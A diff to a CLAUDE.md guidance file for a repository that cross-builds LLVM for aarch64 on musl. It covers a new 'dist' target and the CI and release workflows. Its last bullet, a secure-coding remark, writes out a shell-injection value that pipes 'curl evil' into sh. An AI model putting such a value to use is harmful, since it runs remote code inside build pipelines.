@@ -4,7 +4,9 @@ This file provides guidance to Claude Code (claude.ai/code) when working with co
 
 ## Project Status
 
-**Steps 1 to 6 of [README.md](README.md) are implemented and verified end to end; step 7 is not written.** `main` still has **no commits at all** — nothing here has ever been committed — and no `origin` remote is configured. It should be `git@github.com:Sepia-OS/llvm.git`, following `Sepia-OS/boot` and `Sepia-OS/rootfs`.
+**Steps 1 to 7 of [README.md](README.md) are implemented; steps 1 to 6 are verified end to end locally.** `main` carries one commit and pushes to `git@github.com:Sepia-OS/llvm.git`, following `Sepia-OS/boot` and `Sepia-OS/rootfs`.
+
+**No CI run has happened yet, so the workflows are unproven.** Steps 1 and 3 were verified by hand in `debian:trixie-slim`; steps 4 to 6 have only ever run on macOS. The first `ci.yml` run is what proves LLVM cross-builds in that container at all — `python3` is in the install list for LLVM's own build-time needs, and if the container turns out to want more, that list is where it goes.
 
 `gmake stage` produces a 189 MiB tree: `clang`, `lld`, twelve binutils equivalents, `clang-format`, the two C++ runtime libraries and clang's builtin headers — all aarch64, all against musl 1.2.6.
 
@@ -19,9 +21,10 @@ This file provides guidance to Claude Code (claude.ai/code) when working with co
 | `gmake llvm` | the cross-build; asserts the products are aarch64 on the musl loader |
 | `gmake stage` | install under `DESTDIR`, prune to `SHIP_BINARIES`, strip, add the runtime libs |
 | `gmake stage-check` | every staged binary aarch64, musl loader, **complete library closure** |
+| `gmake dist` | tar + `xz -9` the staged `usr/` tree into `dist/`, with `SHA256SUMS` |
 | `*-info` / `verify-downloads` / `runtime-libs` / `clean` / `distclean` / `print-%` | the house-style accessories |
 
-Not yet written: release publishing (step 7) and any CI.
+`dist` asserts before packing that no `libc.so*` or `ld-musl-*` is in the tree. Only LLVM ships: the two C++ runtime libraries travel with it because clang cannot start without them and nothing else provides them, but the device's musl comes from `rootfs` and a second copy on the card is two libcs disagreeing. `DIST_TAG` appends the release tag to the filename; the release workflow sets it and reads the name back with `make -s DIST_TAG=… print-DIST_ASSET`.
 
 Overriding a variable touches no file, so each expensive tree carries a `.config` signature stamp (`MUSL_SIG`, `HOST_SIG`, `TARGET_SIG`, `STAGE_SIG`) — `../boot`'s `CONFIG_SIG` idiom. Without it `gmake MUSL_VERSION=1.2.5 sysroot` reports "Nothing to be done" and leaves 1.2.6 in place. Verified both ways: an unchanged signature leaves the stamp's mtime alone, a changed one rewrites it. Note that `gmake -n` **cannot** test this — `FORCE` makes the stamp look permanently dirty under dry-run, so both cases look identical.
 
@@ -94,6 +97,20 @@ Both siblings are single-Makefile builds with the same shape. Match it rather th
 - **Target naming:** an aggregate goal (`musl`, `image`, …) plus `<thing>-info` (what version, from where, how big) and `<thing>-check` (re-read the artifact and assert it). Every aggregate goal ends with a `READY` line that prints whether or not anything was rebuilt — a satisfied phony goal otherwise prints nothing, which reads exactly like a broken target.
 - **`print-%`** exposes any variable to scripts and CI (`gmake -s print-IMAGE`). `boot`'s release workflow depends on it, which makes those variable names a CI contract.
 - **CI runs in `debian:trixie-slim`**, and installs build tools *before* `actions/checkout` — without `git` in the container, checkout silently degrades to a tarball download. Releases are **never automatic**: a manual `workflow_dispatch` takes a version string, a gate job refuses a commit with no green CI run, `main` is branched to `rel-<version>`, and a rollback job deletes the branch if the build fails. See [../boot/docs/CI.md](../boot/docs/CI.md).
+
+## CI and Releases
+
+Two workflows, both calling only documented `make` targets so any failure reproduces locally verbatim. The reasoning `../boot/docs/CI.md` records applies here too; what differs is scale, and everything below follows from it.
+
+- **[ci.yml](.github/workflows/ci.yml) builds everything on every commit on every branch**, as one job — every step after the first depends on the tree the previous one left, and shuttling a multi-gigabyte build tree between jobs would cost more than rebuilding it. A run is hours, not the seconds the siblings take, which is why `cancel-in-progress` matters here and why `timeout-minutes: 350` sits just under the six-hour ceiling a hosted runner imposes: past that the job is cancelled with no diagnosis and no artifacts.
+- **The Makefile only tails 30–40 lines of a failed cmake or ninja log**, so both workflows upload `build/*.log`, `build/{host,target}/build.log` and `build/musl/*/build.log` on failure. Without that a CI failure is 40 lines out of tens of thousands.
+- **`python3` is in the `apt-get` list for LLVM's sake, not this repo's** — and `cmake`/`ninja` are new to SepiaOS, so the install list here is longer than either sibling's. Build tools still go in before `actions/checkout`, or checkout silently degrades to a tarball download.
+- **CI runs `make dist` too**, so the release path is exercised on every commit rather than for the first time during a release. The asset is not uploaded; `release.yml` builds its own.
+- **[release.yml](.github/workflows/release.yml) deletes every previous release**, with `--cleanup-tag`, before creating the new one. That is safe only because each released commit is also the head of a `rel-<version>` branch, which is never deleted — **so do not add branch cleanup**, or deleting a release would make its commit unreachable. Deletion happens in `publish`, after the build, so nothing is destroyed until there is an asset to replace it with.
+- **The gate does *not* refuse a version that already exists**, unlike `../boot`'s: re-releasing is a supported path here, so an existing `rel-<version>` branch is moved to `main`'s head rather than treated as an error. `gate.outputs.created` records which happened, and `rollback` deletes only a branch this run made.
+- **Creating the release branch triggers `ci.yml` on it** — a second multi-hour build of a commit the gate has already confirmed green. It costs a runner and delays nothing, but it is real money at this scale. The fix, if it is ever wanted, is `branches-ignore: ['rel-*']` in `ci.yml`, not shell logic in `release.yml`.
+- **`print-%` and these variable names are a CI contract**: `DIST_ASSET`, `LLVM_VERSION`, `MUSL_VERSION`, `LLVM_TRIPLE`, `TC_VENDOR`, `TC_VERSION`. The release notes are generated from them rather than restating what the Makefile already knows.
+- `inputs.version` reaches bash through the environment, never through `${{ }}` interpolation into a script line — the substitution happens before bash sees the line, so `x"; curl evil | sh; #` would otherwise run.
 
 ## The Two Build Trees
 
